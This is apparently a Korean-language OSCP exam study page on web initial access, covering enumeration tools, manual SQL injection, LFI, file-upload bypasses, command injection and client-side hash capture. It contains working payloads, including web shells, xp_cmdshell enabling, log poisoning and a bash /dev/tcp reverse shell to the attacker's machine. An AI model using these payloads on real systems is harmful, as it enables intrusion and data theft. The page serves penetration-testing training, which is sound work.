---
title: 웹과 초기 침투
tags:
  - oscp
---

# 웹과 초기 침투 { #web-initial-access }

<div class="dfir-meta" markdown>
**배점:** standalone당 10점 (`local.txt`) · **최종 수정:** 2026-11-03
</div>

!!! abstract "한 문장 요약"
    standalone에서 첫 셸 얻기. 보통 웹 애플리케이션이나 노출된 서비스이고, 고쳐야 돌아가는 공개 익스플로잇인 경우가 많습니다 — 자동 스캐너가 아니라 꼼꼼한 콘텐츠 탐색과 수동 테스트로 찾아요.

!!! tip "실전 실행 참고"
    명령 선택·출력 해석·실패 진단은 [실전 종합 가이드](practical-guide.md#burp), Windows·AD 프로토콜별 상세 사용법은 [Impacket 집중 가이드](impacket.md)를 참고하세요.

## 1. 개념 { #concept }

OSCP 머신의 초기 침투는 거의 다 아래 중 하나이고, 대략 자주 나오는 순서입니다.

| 유형 | 전형적인 신호 | 이어지는 곳 |
|---|---|---|
| **취약한 알려진 소프트웨어** | 버전 번호가 보이는 CMS / 앱 / 서비스 | 공개 익스플로잇(`searchsploit`), 대개 수정 필요 |
| **기본 / 약한 / 재사용 크리덴셜** | 관리 패널, Tomcat, Jenkins, Grafana, DB, SSH | 코드를 실행하는 인증 후 기능(플러그인, 템플릿, WAR 배포) |
| **숨은 콘텐츠** | `/` 에 볼 게 없음 | `/backup`, `/dev`, `.git/`, 두 번째 vhost, API |
| **앱 로직 결함** | 출력이 바뀌는 파라미터 | SQLi, LFI / 경로 탐색, 업로드 우회, 명령 주입, SSRF |
| **클라이언트 사이드** | 파일을 열거나 링크를 누르는 "사용자" | 악성 문서 / 바로가기, NetNTLMv2 캡처 |

기본 원칙: **모든 포트를 설명할 수 있을 때까지 정보 수집** 하고, 가장 싼 아이디어부터 시도.

## 2. 주요 도구 { #tools }

| 도구 | 용도 | 시험 허용 여부 |
|---|---|---|
| **ffuf** | 경로, 파라미터, vhost 빠른 퍼징 | 허용 |
| **feroxbuster** | 재귀 디렉터리 탐색 | 허용 |
| **gobuster** | 디렉터리와 vhost 브루트포스(단순, 안정적) | 허용 |
| **nikto** | 웹 서버 설정 오류 빠른 확인 | 허용 (가이드에 명시) |
| **Burp Suite Community** | Proxy, Repeater, Decoder, Comparer | 허용 |
| **searchsploit** | 오프라인 Exploit-DB 검색과 복사 | 허용 |
| **whatweb / curl / 브라우저 개발자 도구** | 핑거프린팅, 헤더, 소스 | 허용 |
| **hydra** | 알려진 사용자로 로그인 브루트포스 | 허용 — 아껴서 → [패스워드 공격](password-attacks.md#hydra) |

!!! danger "시험 규칙 — 금지된 웹 도구"
    - **sqlmap / SQLninja** 와 그 밖의 *자동 익스플로잇* 도구 — 금지. SQLi는 손으로 → [수동 SQLi](#sqli).
    - **Burp Suite Pro**(및 다른 상용 도구) — 금지. Burp **Community** 는 괜찮고, 어차피 Scanner가 없어요.
    - **대량 취약점 스캐너**(Nessus, OpenVAS, Acunetix처럼 크롤링+스캔하는 도구) — 금지.
    - 허용된 도구 안의 기능이라도 금지된 일을 하면(예: 자동 익스플로잇 플러그인) — 역시 금지.

## 3. 시나리오 { #scenarios }

### 3.1 웹 포트 첫 확인 { #first-look }

**상황:** `80/tcp open http Apache httpd 2.4.x`(또는 아무 웹 포트).

```bash
whatweb -a 3 http://$IP
curl -si http://$IP/ | head -30            # 헤더: Server, X-Powered-By, 쿠키, 리다이렉트
curl -s http://$IP/robots.txt
nikto -h http://$IP -o loot/nikto.txt
```

그다음 **Burp Community를 거쳐** 브라우저로 열어서 모든 요청이 HTTP history에 남게 합니다. 페이지 소스(`Ctrl-U`)에서 주석, JS 파일 경로, API 엔드포인트, 버전 문자열을 읽으세요.

**볼 것:** 호스트 이름으로의 리다이렉트(→ `/etc/hosts`), CMS generator 태그, `X-Powered-By: PHP/7.x`, `nikto` 결과의 `/phpmyadmin/`, `/server-status`, 백업 파일, `PUT` 허용.

**다음:** CMS 이름 + 버전 → [searchsploit](#searchsploit). 아니면 → 콘텐츠 탐색.

### 3.2 콘텐츠 탐색 — ffuf / feroxbuster / gobuster { #content-discovery }

**상황:** 첫 페이지에서 나오는 게 없음.

=== "feroxbuster (재귀)"

    ```bash
    feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
      -x php,txt,html,bak,zip -t 50 -o loot/ferox.txt
    ```

=== "ffuf (유연함)"

    ```bash
    ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
      -e .php,.txt,.bak -fc 404 -o loot/ffuf.json
    ```

=== "gobuster (단순함)"

    ```bash
    gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/common.txt \
      -x php,txt,bak -o loot/gobuster.txt
    ```

**볼 것:** 예상 밖 이름의 `200`, `301`(`/admin`, `/dev`, `/backup`, `/uploads`, `/api`), 디렉터리의 `403`(그 *안* 을 퍼징), `config.php.bak`, `.git/HEAD`, `.env` 같은 파일.

**다음:**

- `/.git/` 노출 → 덤프(`git-dumper http://$IP/.git loot/git`)하고 히스토리에서 크리덴셜 찾기.
- `/uploads/` 존재 → 그곳에 쓰는 업로드 폼 찾기.
- 로그인 페이지 → 기본값, 그다음 제품 문서의 기본 크리덴셜.

!!! tip "상태 코드만이 아니라 크기로 거르기"
    많은 앱이 모든 요청에 `200` 을 줍니다. 한 번 돌려서 쓰레기 응답 크기를 확인하고, `-fs <size>`(ffuf)나 `--filter-size <size>`(feroxbuster)를 붙이세요.

### 3.3 가상 호스트 / 서브도메인 { #vhosts }

**상황:** nmap이나 리다이렉트에서 `site.local` 같은 도메인이 나옴.

```bash
ffuf -u http://$IP -H "Host: FUZZ.site.local" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
# 또는
gobuster vhost -u http://site.local --append-domain \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**다음:** 찾은 것(`dev.site.local`)을 `/etc/hosts` 에 넣고 3.1–3.2를 반복 — dev vhost에는 더 오래된 취약한 빌드가 돌고 있는 경우가 많아요.

### 3.4 알려진 소프트웨어 → searchsploit { #searchsploit }

**상황:** `Product X 2.3.1` 을 확인함.

```bash
searchsploit product x 2.3
searchsploit -x 49876          # 읽기
searchsploit -m 49876          # 현재 디렉터리로 복사
```

웹에서도 찾아보세요: `"Product X 2.3.1" exploit`, `CVE-XXXX-YYYY poc github`.

**공개 익스플로잇을 돌리기 전에:**

1. **읽기.** 뭘 보내고, 뭘 돌려받길 기대하고, 인증이 필요한가?
2. **고치기.** 대상 URL / 포트 / 경로, `LHOST` / `LPORT`, Python 2 → 3(`print`, `bytes` vs `str`), SSL 검증, 하드코딩된 경로.
3. **내장 셸코드는** 직접 만든 `msfvenom` 출력으로 **바꾸기** → [셸과 파일 전송](shells-file-transfer.md#msfvenom).
4. 리포트용으로 **변경 사항을 전부 기록** ([시험 규칙](exam-format.md#exploit-code)).

**실패했을 때 볼 것:** 프록시를 걸고(Python이면 `proxies={'http':'http://127.0.0.1:8080'}`) Burp에서 요청을 보세요 — 보통 경로나 CSRF 토큰이 틀려 있습니다.

### 3.5 Burp Suite Community — 수동 테스트 흐름 { #burp }

**상황:** 폼이나 파라미터를 찾았고 손으로 테스트하고 싶음.

1. Proxy → HTTP history → 요청 우클릭 → **Send to Repeater**(`Ctrl-R`).
2. 한 번에 하나씩 바꾸고 응답(길이, 오류, 시간)을 비교 — 미묘한 차이는 **Comparer**.
3. 페이로드의 base64 / URL 인코딩은 **Decoder**.
4. Community의 Intruder는 속도 제한이 있으니, 파라미터 워드리스트 퍼징은 Burp에서 저장한 요청으로 `ffuf` 를:

```bash
# Burp에서 요청을 req.txt로 저장하고, 페이로드 자리에 FUZZ
ffuf -request req.txt -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -mr 'error|syntax'
```

### 3.6 SQL injection — 수동만 { #sqli }

**상황:** 파라미터(`?id=1`, 로그인 폼, 검색창)가 따옴표 하나에 다르게 반응함.

**탐지:**

```text
id=1'                      → SQL 오류?          (error-based 가능)
id=1 AND 1=1-- -  vs  id=1 AND 1=2-- -   → 페이지가 다름?   (boolean)
id=1' AND SLEEP(5)-- -     → 5초 지연?          (time-based, MySQL)
id=1'; WAITFOR DELAY '0:0:5'-- -                 (time-based, MSSQL)
```

**로그인 우회:** 사용자 이름에 `admin' -- -` 또는 `' OR 1=1-- -`.

**UNION 추출 (MySQL 예):**

```text
id=1 ORDER BY 1-- -        … 오류가 날 때까지 올림 → 컬럼 N개
id=-1 UNION SELECT 1,2,3-- -                       → 어느 컬럼이 화면에 찍히나?
id=-1 UNION SELECT 1,@@version,database()-- -
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
id=-1 UNION SELECT 1,group_concat(username,':',password),3 FROM users-- -
```

**SQLi에서 셸로:**

| DBMS | 기법 | 조건 |
|---|---|---|
| MySQL | `UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/c.php'` | FILE 권한, 쓰기 가능한 웹 루트, `secure_file_priv` 비어 있음 |
| MSSQL | `'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -` 그다음 `'; EXEC xp_cmdshell 'powershell -c ...'-- -` | sysadmin, stacked query |
| MSSQL | `'; EXEC master..xp_dirtree '\\<KALI>\share'-- -` | 아무 로그인 → 서비스 계정의 NetNTLMv2가 내 `impacket-smbserver` 에 잡힘 |
| PostgreSQL | `'; COPY (SELECT '') TO PROGRAM 'id > /tmp/o'-- -` | superuser |

**다음:** 덤프한 해시 → [패스워드 공격](password-attacks.md); 크리덴셜 → SSH / 관리 패널 / SMB에 시도.

!!! danger "시험 규칙"
    sqlmap은 금지입니다 — "탐지만 하려고"도 포함. DBMS별로 내 페이로드 노트를 만들어 두세요. 위 표가 출발점이에요.

### 3.7 파일 업로드 → 리버스 셸 { #file-upload }

**상황:** 업로드 폼(프로필 사진, 문서 가져오기, 플러그인 업로드).

1. 무해한 파일을 올려 **어디에 저장되는지** 찾기(응답, 페이지 소스, `/uploads/`, feroxbuster).
2. 최소한의 웹 셸 시도: `shell.php` 에 `<?php system($_GET['c']); ?>`.
3. 막히면 한 번에 변수 하나씩 바꿔 필터 우회:
    - 확장자: `.phtml`, `.php5`, `.phar`, `.pHp`, `shell.php.jpg`, `shell.jpg.php`
    - Burp에서 `Content-Type: image/png`
    - 매직 바이트: 파일을 `GIF89a;` 로 시작
    - `AddType application/x-httpd-php .evil` 를 담은 `.htaccess` 업로드 후 `shell.evil`
    - IIS: `.aspx`, `.asp`, `.config`; Tomcat: manager로 WAR
4. 실행 확인: `curl "http://$IP/uploads/shell.php?c=id"`.
5. **리버스 셸로 업그레이드** (플래그 스크린샷에는 웹 셸로 부족해요):

```bash
curl "http://$IP/uploads/shell.php" --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'"
```

### 3.8 LFI / 경로 탐색 { #lfi }

**상황:** `?page=about.php`, `?file=report.pdf`, `?lang=en`.

```text
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd                     (필터가 ../ 를 한 번만 지울 때)
?page=php://filter/convert.base64-encode/resource=index.php   (PHP 소스 읽기)
?page=C:\Windows\System32\drivers\etc\hosts            (Windows)
```

퍼징: `ffuf -u "http://$IP/index.php?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs <size>`

**볼 것:** `/etc/passwd`(셸이 있는 사용자), 앱 설정 파일(DB 크리덴셜), `/home/<user>/.ssh/id_rsa`, `C:\inetpub\wwwroot\web.config`.

**LFI → RCE 방법:** 업로드한 파일 include; **로그 포이즈닝**(User-Agent로 `<?php system($_GET['c']); ?>` 를 보낸 뒤 `/var/log/apache2/access.log&c=id` include); `allow_url_include` 가 켜져 있으면 `data://` / `php://input` 래퍼; 원격 include가 되면 RFI(`?page=http://$KALI/shell.php`). Windows에서는 UNC 경로(`\\$KALI\share\x`)로의 LFI가 내 SMB 서버로 NetNTLMv2 해시를 흘릴 수 있어요.

### 3.9 명령 주입 { #command-injection }

**상황:** 입력을 받는 "ping", "nslookup", "convert", "backup" 기능.

```text
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
$(id)    `id`
127.0.0.1%0aid             (개행)
```

블라인드라면? 시간(`; sleep 5`)이나 외부 콜백(`; curl http://$KALI/x` 후 `python3 -m http.server` 확인)을 쓰세요.

### 3.10 로그인 페이지, 기본 크리덴셜, 브루트포스 { #logins }

1. 제품 기본값(`admin:admin`, `tomcat:s3cret`, `admin:password`), 제품 문서, `/usr/share/seclists/Passwords/Default-Credentials/`.
2. 사용자 이름 = 비밀번호; 사이트에 나온 이름을 사용자 이름으로.
3. 그다음에야 **hydra** 로 표적 브루트포스 → [패스워드 공격 › hydra](password-attacks.md#hydra).

로그인했다면? 코드를 실행하는 기능을 찾으세요: WordPress 테마 / 플러그인 편집기, Tomcat manager WAR 배포, Jenkins 스크립트 콘솔, CMS 템플릿 편집기, "가져오기" 기능.

### 3.11 클라이언트 사이드 공격 { #client-side }

박스가 파일을 여는 사용자를 흉내 낸다면(메일 서버, "이력서 보내기" 업로드, 누군가 둘러보는 쓰기 가능 공유):

- Windows가 **내** SMB 서버로 접속하게 만드는 파일을 심고(아이콘이나 대상 경로가 `\\$KALI\share` 인 `.url` / `.lnk` / `.library-ms`), `impacket-smbserver` 로 NetNTLMv2를 받습니다.
- 시나리오가 분명히 그걸 기대하면 페이로드(PowerShell 다운로드 크래들을 실행하는 바로가기, 매크로 문서)를 전달.

!!! danger "시험 규칙 — 스푸핑 금지"
    Responder로 LLMNR / NBT-NS / mDNS를, mitm6로 DHCPv6를 **포이즈닝** 해서 해시를 잡는 건 스푸핑이라 금지입니다. 대상이 *나에게 접속하게* 만드는 건 괜찮아요 → [AD › Coercion](active-directory.md#coercion).

이런 페이로드의 방어자 관점: [Red Team: 초기 침투](../../redteam/initial-access.md) · [피싱 전달](../../adversary/phishing-delivery.md) · [LNK와 점프 리스트](../../windows/lnk-jumplists.md).

## 4. 자주 하는 실수 { #mistakes }

- **워드리스트 하나, 확장자 하나.** `.php` 앱은 `config.php.bak` 을, IIS 앱은 `.aspx` 를 숨깁니다. 스택에 맞게 확장자를 고르세요.
- **`403` 디렉터리 안이나 새 vhost를 퍼징 안 함.**
- **공개 익스플로잇을 안 읽고 실행** — 그래서 실패한 건지 취약하지 않은 건지 모름.
- **웹 셸로 계속 버티기.** 플래그 스크린샷에는 대화형 리버스 셸이 필요해요([플래그 규칙](exam-format.md#flag-rules)).
- **필터가 있으면 막다른 길이라고 단정.** OSCP의 업로드 / LFI 필터는 대개 허술합니다. 변형을 체계적으로 시도하세요.
- **무작정 브루트포스.** 확인된 사용자 이름 없이 `rockyou.txt` 로 hydra를 돌리면 한 시간이 날아갑니다.

## 5. 시험 팁 { #exam-tips }

- 처음부터 *모든 것을* Burp로 프록시하세요 — 성공한 요청이 곧 리포트 증거입니다.
- 익스플로잇에 리버스 셸이 필요하면 `LPORT` 는 **443이나 80** 으로. egress 필터링이 흔해요.
- 통하는 순간 취약한 URL, 파라미터, 페이로드를 노트에 적으세요.
- 45분째 막혔다면? [정찰](recon-enumeration.md)로 돌아가세요 — 대충 넘긴 포트나 경로가 보통 있습니다.

## 관련 페이지 { #related-pages }

- [시험 흐름](exam-workflow.md) · [정찰과 정보 수집](recon-enumeration.md) · [셸과 파일 전송](shells-file-transfer.md) · [패스워드 공격](password-attacks.md)
- [HTTP 상태 코드](../../basics/http-status-codes.md) · [잘 알려진 포트](../../basics/well-known-ports.md)
- [Red Team: 초기 침투](../../redteam/initial-access.md) · [피싱 전달](../../adversary/phishing-delivery.md) · [PowerShell 크래들](../../adversary/powershell-cradles.md)

## 참고 자료 { #references }

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [SecLists](https://github.com/danielmiessler/SecLists)
